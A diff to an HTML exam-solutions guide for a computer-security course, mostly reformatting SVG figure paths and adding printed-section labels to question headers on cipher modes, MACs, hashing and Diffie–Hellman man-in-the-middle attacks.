+<path clip-path="url(#fig-3-p4cde781957)" d="M 133.399012 138.924
+Q 160.694561 138.924 186.536667 138.924
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-3-p4cde781957)" d="M 181.336667 136.324 
-L 186.536667 138.924 
-L 181.336667 141.524 
-L 181.336667 136.324 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 181.336667 136.324
+L 186.536667 138.924
+L 181.336667 141.524
+L 181.336667 136.324
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-3-patch_11">
-<path clip-path="url(#fig-3-p4cde781957)" d="M 298.008501 138.924 
-Q 329.488104 138.924 359.514264 138.924 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 298.008501 138.924
+Q 329.488104 138.924 359.514264 138.924
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-3-p4cde781957)" d="M 354.314264 136.324 
-L 359.514264 138.924 
-L 354.314264 141.524 
-L 354.314264 136.324 
+<path clip-path="url(#fig-3-p4cde781957)" d="M 354.314264 136.324
+L 359.514264 138.924
+L 354.314264 141.524
+L 354.314264 136.324
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -1147,7 +1147,7 @@ z
 <p><a id="s31"></a></p>
 </section><section class="question"><h3>S31 · 2021–22 · Q2(d)</h3>
 <p><strong>Identify ECB-style long-message weakness and replace the mode · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> A cryptanalyst says the system is secure for short messages but vulnerable for long messages because of its mode of operation. Identify and describe the mode and explain how to overcome the problem.</p>
 </blockquote>
@@ -1161,7 +1161,7 @@ z
 <p><a id="s62"></a></p>
 </section><section class="question"><h3>S62 · 2018–19 · Q5(b)</h3>
 <p><strong>Inserted ciphertext bit and CBC synchronization · 3 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=27">root question PDF, page 27</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=27">root question PDF, page 27</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> A message is encrypted with DES-CBC. An extra 0 bit is inserted into the ciphertext stream after block C_i. How much plaintext is garbled?</p>
 </blockquote>
@@ -1177,7 +1177,7 @@ Received: ... | C4 | 0 c5[1] ... c5[63] | c5[64] c6[1] ...
 <p><a id="s08"></a></p>
 <section class="question"><h3>S08 · 2023–24 · Q8(a)</h3>
 <p><strong>Encrypt-then-MAC versus MAC-then-encrypt · 5 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> What is authenticated encryption? Which of MAC-then-encrypt and encrypt-then-MAC is preferable, and why?</p>
 </blockquote>
@@ -1191,7 +1191,7 @@ Received: ... | C4 | 0 c5[1] ... c5[63] | c5[64] c6[1] ...
 <p><a id="s15"></a></p>
 </section><section class="question"><h3>S15 · 2022–23 · Q5(b)</h3>
 <p><strong>Analyze encryption plus hash, plaintext MAC, or ciphertext MAC · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=12">root question PDF, page 12</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=12">root question PDF, page 12</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Alice sends (1) Enc(K,m) with Hash(ciphertext), (2) Enc(K,m) with MAC(K,m), or (3) Enc(K,m) with MAC(K,ciphertext). Assume no harmful interactions from the shared key. For each, evaluate confidentiality against passive Eve and integrity against modifying MITM Mallory.</p>
 </blockquote>
@@ -1228,7 +1228,7 @@ Received: ... | C4 | 0 c5[1] ... c5[63] | c5[64] c6[1] ...
 <p><a id="s22"></a></p>
 </section><section class="question"><h3>S22 · 2022–23 · Q8(a)</h3>
 <p><strong>Integrity tags in a file header; hash versus MAC; writable versus read-only storage · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=14">root question PDF, page 14</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=14">root question PDF, page 14</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> A file’s integrity tag is stored in its header and checked when opened. An attacker must not modify the file undetected. Compare (i) an unkeyed collision-resistant hash, (ii) a MAC under the owner’s secret key and (iii) the MAC scheme when the tag is in read-only memory. Decide whether each system is secure.</p>
 </blockquote>
@@ -1241,7 +1241,7 @@ Received: ... | C4 | 0 c5[1] ... c5[63] | c5[64] c6[1] ...
 <p><a id="s32"></a></p>
 </section><section class="question"><h3>S32 · 2021–22 · Q3(b)</h3>
 <p><strong>Applications of hashing in authentication, confidentiality and signatures · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=15">root question PDF, page 15</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Demonstrate uses of a hash function for authentication, confidentiality and digital signatures.</p>
 </blockquote>
@@ -1258,7 +1258,7 @@ message + encryption key → secure encryption → ciphertext
 <p><a id="s33"></a></p>
 </section><section class="question"><h3>S33 · 2021–22 · Q3(c)</h3>
 <p><strong>Evaluate XOR of fixed-size message blocks as a hash · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Explain the desired properties of a cryptographic hash. A message consists of l blocks M1,…,Ml of 160 bits and h(x)=M1 XOR … XOR Ml. Evaluate this function against those properties.</p>
 </blockquote>
@@ -1273,7 +1273,7 @@ message + encryption key → secure encryption → ciphertext
 <p><a id="s35"></a></p>
 </section><section class="question"><h3>S35 · 2021–22 · Q4(b)</h3>
 <p><strong>HMAC construction · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=16">root question PDF, page 16</a>. Sitting date: 30 October 2023. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Describe how a message authentication code is created by HMAC.</p>
 </blockquote>
@@ -1303,133 +1303,133 @@ message + encryption key → secure encryption → ciphertext
 </defs>
 <g id="fig-4-figure_1">
 <g id="fig-4-patch_1">
-<path d="M 0 172.512 
-L 575.28 172.512 
-L 575.28 0 
-L 0 0 
+<path d="M 0 172.512
+L 575.28 172.512
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-4-axes_1">
 <g id="fig-4-patch_2">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 22.032 87.9192 
-L 157.068 87.9192 
-Q 160.974 87.9192 160.974 84.0384 
-L 160.974 49.6656 
-Q 160.974 45.7848 157.068 45.7848 
-L 22.032 45.7848 
-Q 18.126 45.7848 18.126 49.6656 
-L 18.126 84.0384 
-Q 18.126 87.9192 22.032 87.9192 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 22.032 87.9192
+L 157.068 87.9192
+Q 160.974 87.9192 160.974 84.0384
+L 160.974 49.6656
+Q 160.974 45.7848 157.068 45.7848
+L 22.032 45.7848
+Q 18.126 45.7848 18.126 49.6656
+L 18.126 84.0384
+Q 18.126 87.9192 22.032 87.9192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-4-patch_3">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 206.172 87.9192 
-L 268.668 87.9192 
-Q 272.574 87.9192 272.574 84.0384 
-L 272.574 49.6656 
-Q 272.574 45.7848 268.668 45.7848 
-L 206.172 45.7848 
-Q 202.266 45.7848 202.266 49.6656 
-L 202.266 84.0384 
-Q 202.266 87.9192 206.172 87.9192 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 206.172 87.9192
+L 268.668 87.9192
+Q 272.574 87.9192 272.574 84.0384
+L 272.574 49.6656
+Q 272.574 45.7848 268.668 45.7848
+L 206.172 45.7848
+Q 202.266 45.7848 202.266 49.6656
+L 202.266 84.0384
+Q 202.266 87.9192 206.172 87.9192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-4-patch_4">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 306.612 87.9192 
-L 542.088 87.9192 
-Q 545.994 87.9192 545.994 84.0384 
-L 545.994 49.6656 
-Q 545.994 45.7848 542.088 45.7848 
-L 306.612 45.7848 
-Q 302.706 45.7848 302.706 49.6656 
-L 302.706 84.0384 
-Q 302.706 87.9192 306.612 87.9192 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 306.612 87.9192
+L 542.088 87.9192
+Q 545.994 87.9192 545.994 84.0384
+L 545.994 49.6656
+Q 545.994 45.7848 542.088 45.7848
+L 306.612 45.7848
+Q 302.706 45.7848 302.706 49.6656
+L 302.706 84.0384
+Q 302.706 87.9192 306.612 87.9192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-4-patch_5">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 164.08782 66.852 
-Q 181.616801 66.852 197.692339 66.852 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 164.08782 66.852
+Q 181.616801 66.852 197.692339 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 192.492339 64.252 
-L 197.692339 66.852 
-L 192.492339 69.452 
-L 192.492339 64.252 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 192.492339 64.252
+L 197.692339 66.852
+L 192.492339 69.452
+L 192.492339 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-4-patch_6">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 275.689182 66.852 
-Q 287.638906 66.852 298.135186 66.852 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 275.689182 66.852
+Q 287.638906 66.852 298.135186 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 292.935186 64.252 
-L 298.135186 66.852 
-L 292.935186 69.452 
-L 292.935186 64.252 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 292.935186 64.252
+L 298.135186 66.852
+L 292.935186 69.452
+L 292.935186 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-4-patch_7">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 22.032 157.2192 
-L 285.408 157.2192 
-Q 289.314 157.2192 289.314 153.3384 
-L 289.314 118.9656 
-Q 289.314 115.0848 285.408 115.0848 
-L 22.032 115.0848 
-Q 18.126 115.0848 18.126 118.9656 
-L 18.126 153.3384 
-Q 18.126 157.2192 22.032 157.2192 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 22.032 157.2192
+L 285.408 157.2192
+Q 289.314 157.2192 289.314 153.3384
+L 289.314 118.9656
+Q 289.314 115.0848 285.408 115.0848
+L 22.032 115.0848
+Q 18.126 115.0848 18.126 118.9656
+L 18.126 153.3384
+Q 18.126 157.2192 22.032 157.2192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-4-patch_8">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 334.512 157.2192 
-L 397.008 157.2192 
-Q 400.914 157.2192 400.914 153.3384 
-L 400.914 118.9656 
-Q 400.914 115.0848 397.008 115.0848 
-L 334.512 115.0848 
-Q 330.606 115.0848 330.606 118.9656 
-L 330.606 153.3384 
-Q 330.606 157.2192 334.512 157.2192 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 334.512 157.2192
+L 397.008 157.2192
+Q 400.914 157.2192 400.914 153.3384
+L 400.914 118.9656
+Q 400.914 115.0848 397.008 115.0848
+L 334.512 115.0848
+Q 330.606 115.0848 330.606 118.9656
+L 330.606 153.3384
+Q 330.606 157.2192 334.512 157.2192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-4-patch_9">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 457.272 157.2192 
-L 542.088 157.2192 
-Q 545.994 157.2192 545.994 153.3384 
-L 545.994 118.9656 
-Q 545.994 115.0848 542.088 115.0848 
-L 457.272 115.0848 
-Q 453.366 115.0848 453.366 118.9656 
-L 453.366 153.3384 
-Q 453.366 157.2192 457.272 157.2192 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 457.272 157.2192
+L 542.088 157.2192
+Q 545.994 157.2192 545.994 153.3384
+L 545.994 118.9656
+Q 545.994 115.0848 542.088 115.0848
+L 457.272 115.0848
+Q 453.366 115.0848 453.366 118.9656
+L 453.366 153.3384
+Q 453.366 157.2192 457.272 157.2192
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-4-patch_10">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 292.42782 136.152 
-Q 309.956801 136.152 326.032339 136.152 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 292.42782 136.152
+Q 309.956801 136.152 326.032339 136.152
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 320.832339 133.552 
-L 326.032339 136.152 
-L 320.832339 138.752 
-L 320.832339 133.552 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 320.832339 133.552
+L 326.032339 136.152
+L 320.832339 138.752
+L 320.832339 133.552
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-4-patch_11">
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 404.031566 136.152 
-Q 427.141628 136.152 448.798245 136.152 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 404.031566 136.152
+Q 427.141628 136.152 448.798245 136.152
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-4-p7365b8f70b)" d="M 443.598245 133.552 
-L 448.798245 136.152 
-L 443.598245 138.752 
-L 443.598245 133.552 
+<path clip-path="url(#fig-4-p7365b8f70b)" d="M 443.598245 133.552
+L 448.798245 136.152
+L 443.598245 138.752
+L 443.598245 133.552
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -1484,7 +1484,7 @@ z
 <p><a id="s46"></a></p>
 </section><section class="question"><h3>S46 · 2020–21 · Q8(b)</h3>
 <p><strong>Birthday bound for a b-bit hash · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=21">root question PDF, page 21</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=21">root question PDF, page 21</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Prove that a b-bit hash function provides b/2-bit security.</p>
 </blockquote>
@@ -1501,7 +1501,7 @@ q=\Theta(\sqrt N)=\Theta(2^{b/2}).
 <p><a id="s52"></a></p>
 </section><section class="question"><h3>S52 · 2019–20 · Q6(b)</h3>
 <p><strong>Weak/strong collision resistance; toy hash; Merkle–Damgård · 21 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=24">root question PDF, page 24</a>. Sitting date: 07 September 2021. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> State ideal hash properties and distinguish weak and strong collision resistance. Show H(x)=(5x+11) mod 19 is not weakly collision resistant for H(4). Draw Merkle–Damgård and explain why its compression function needs strong collision resistance.</p>
 </blockquote>
@@ -1539,140 +1539,140 @@ h_i=f(h_{i-1},m_i),\qquad H(M)=h_t.
 </defs>
 <g id="fig-5-figure_1">
 <g id="fig-5-patch_1">
-<path d="M 0 172.512 
-L 575.28 172.512 
-L 575.28 0 
-L 0 0 
+<path d="M 0 172.512
+L 575.28 172.512
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-5-axes_1">
 <g id="fig-5-patch_2">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 16.452 104.5512 
-L 84.528 104.5512 
-Q 88.434 104.5512 88.434 100.6704 
-L 88.434 69.0696 
-Q 88.434 65.1888 84.528 65.1888 
-L 16.452 65.1888 
-Q 12.546 65.1888 12.546 69.0696 
-L 12.546 100.6704 
-Q 12.546 104.5512 16.452 104.5512 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 16.452 104.5512
+L 84.528 104.5512
+Q 88.434 104.5512 88.434 100.6704
+L 88.434 69.0696
+Q 88.434 65.1888 84.528 65.1888
+L 16.452 65.1888
+Q 12.546 65.1888 12.546 69.0696
+L 12.546 100.6704
+Q 12.546 104.5512 16.452 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-5-patch_3">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 128.052 104.5512 
-L 193.338 104.5512 
-Q 197.244 104.5512 197.244 100.6704 
-L 197.244 69.0696 
-Q 197.244 65.1888 193.338 65.1888 
-L 128.052 65.1888 
-Q 124.146 65.1888 124.146 69.0696 
-L 124.146 100.6704 
-Q 124.146 104.5512 128.052 104.5512 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 128.052 104.5512
+L 193.338 104.5512
+Q 197.244 104.5512 197.244 100.6704
+L 197.244 69.0696
+Q 197.244 65.1888 193.338 65.1888
+L 128.052 65.1888
+Q 124.146 65.1888 124.146 69.0696
+L 124.146 100.6704
+Q 124.146 104.5512 128.052 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-5-patch_4">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 162.09 52.219819 
-Q 162.09 57.149496 162.09 60.625729 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 162.09 52.219819
+Q 162.09 57.149496 162.09 60.625729
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 164.69 55.425729 
-L 162.09 60.625729 
-L 159.49 55.425729 
-L 164.69 55.425729 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 164.69 55.425729
+L 162.09 60.625729
+L 159.49 55.425729
+L 164.69 55.425729
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-5-patch_5">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 91.548501 84.5928 
-Q 106.28816 84.5928 119.574376 84.5928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 91.548501 84.5928
+Q 106.28816 84.5928 119.574376 84.5928
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 114.374376 81.9928 
-L 119.574376 84.5928 
-L 114.374376 87.1928 
-L 114.374376 81.9928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 114.374376 81.9928
+L 119.574376 84.5928
+L 114.374376 87.1928
+L 114.374376 81.9928
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-5-patch_6">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 281.502 104.5512 
-L 346.788 104.5512 
-Q 350.694 104.5512 350.694 100.6704 
-L 350.694 69.0696 
-Q 350.694 65.1888 346.788 65.1888 
-L 281.502 65.1888 
-Q 277.596 65.1888 277.596 69.0696 
-L 277.596 100.6704 
-Q 277.596 104.5512 281.502 104.5512 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 281.502 104.5512
+L 346.788 104.5512
+Q 350.694 104.5512 350.694 100.6704
+L 350.694 69.0696
+Q 350.694 65.1888 346.788 65.1888
+L 281.502 65.1888
+Q 277.596 65.1888 277.596 69.0696
+L 277.596 100.6704
+Q 277.596 104.5512 281.502 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-5-patch_7">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 315.54 52.219819 
-Q 315.54 57.149496 315.54 60.625729 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 315.54 52.219819
+Q 315.54 57.149496 315.54 60.625729
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 318.14 55.425729 
-L 315.54 60.625729 
-L 312.94 55.425729 
-L 318.14 55.425729 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 318.14 55.425729
+L 315.54 60.625729
+L 312.94 55.425729
+L 318.14 55.425729
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-5-patch_8">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 203.150034 84.5928 
-Q 238.814697 84.5928 273.025915 84.5928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 203.150034 84.5928
+Q 238.814697 84.5928 273.025915 84.5928
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 267.825915 81.9928 
-L 273.025915 84.5928 
-L 267.825915 87.1928 
-L 267.825915 81.9928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 267.825915 81.9928
+L 273.025915 84.5928
+L 267.825915 87.1928
+L 267.825915 81.9928
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-5-patch_9">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 434.952 104.5512 
-L 500.238 104.5512 
-Q 504.144 104.5512 504.144 100.6704 
-L 504.144 69.0696 
-Q 504.144 65.1888 500.238 65.1888 
-L 434.952 65.1888 
-Q 431.046 65.1888 431.046 69.0696 
-L 431.046 100.6704 
-Q 431.046 104.5512 434.952 104.5512 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 434.952 104.5512
+L 500.238 104.5512
+Q 504.144 104.5512 504.144 100.6704
+L 504.144 69.0696
+Q 504.144 65.1888 500.238 65.1888
+L 434.952 65.1888
+Q 431.046 65.1888 431.046 69.0696
+L 431.046 100.6704
+Q 431.046 104.5512 434.952 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-5-patch_10">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 468.99 52.219819 
-Q 468.99 57.149496 468.99 60.625729 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 468.99 52.219819
+Q 468.99 57.149496 468.99 60.625729
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 471.59 55.425729 
-L 468.99 60.625729 
-L 466.39 55.425729 
-L 471.59 55.425729 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 471.59 55.425729
+L 468.99 60.625729
+L 466.39 55.425729
+L 471.59 55.425729
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-5-patch_11">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 356.600034 84.5928 
-Q 392.264697 84.5928 426.475915 84.5928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 356.600034 84.5928
+Q 392.264697 84.5928 426.475915 84.5928
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 421.275915 81.9928 
-L 426.475915 84.5928 
-L 421.275915 87.1928 
-L 421.275915 81.9928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 421.275915 81.9928
+L 426.475915 84.5928
+L 421.275915 87.1928
+L 421.275915 81.9928
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-5-patch_12">
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 507.261566 84.5928 
-Q 530.371628 84.5928 552.028245 84.5928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 507.261566 84.5928
+Q 530.371628 84.5928 552.028245 84.5928
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-5-p73df0e33a3)" d="M 546.828245 81.9928 
-L 552.028245 84.5928 
-L 546.828245 87.1928 
-L 546.828245 81.9928 
+<path clip-path="url(#fig-5-p73df0e33a3)" d="M 546.828245 81.9928
+L 552.028245 84.5928
+L 546.828245 87.1928
+L 546.828245 81.9928
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -1724,7 +1724,7 @@ z
 <p><a id="s03"></a></p>
 <section class="question"><h3>S03 · 2023–24 · Q6(a)</h3>
 <p><strong>Unauthenticated Diffie–Hellman MITM; defense without a trusted third party · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=8">root question PDF, page 8</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=8">root question PDF, page 8</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Given the stated Diffie–Hellman protocol, act as Mallory when no trusted third parties can verify Alice or Bob. Explain and diagram a successful MITM attack, then briefly explain a defense.</p>
 </blockquote>
@@ -1753,93 +1753,93 @@ z
 </defs>
 <g id="fig-6-figure_1">
 <g id="fig-6-patch_1">
-<path d="M 0 294.48 
-L 575.28 294.48 
-L 575.28 0 
-L 0 0 
+<path d="M 0 294.48
+L 575.28 294.48
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-6-axes_1">
 <g id="fig-6-patch_2">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 49.702673 55.764 
-Q 167.671096 55.764 284.186076 55.764 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 49.702673 55.764
+Q 167.671096 55.764 284.186076 55.764
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 278.986076 53.164 
-L 284.186076 55.764 
-L 278.986076 58.364 
-L 278.986076 53.164 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 278.986076 53.164
+L 284.186076 55.764
+L 278.986076 58.364
+L 278.986076 53.164
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-6-patch_3">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 289.642673 89.952 
-Q 407.611096 89.952 524.126076 89.952 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 289.642673 89.952
+Q 407.611096 89.952 524.126076 89.952
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 518.926076 87.352 
-L 524.126076 89.952 
-L 518.926076 92.552 
-L 518.926076 87.352 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 518.926076 87.352
+L 524.126076 89.952
+L 518.926076 92.552
+L 518.926076 87.352
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-6-patch_4">
-<path clip-path="url(#fig-6-pba7d367ae1)" d="M 525.577327 124.14 
-Q 407.608904 124.14 291.093924 124.14 
+<path clip-path="url(#fig-6-pba7d367ae1)" d="M 525.577327 124.14
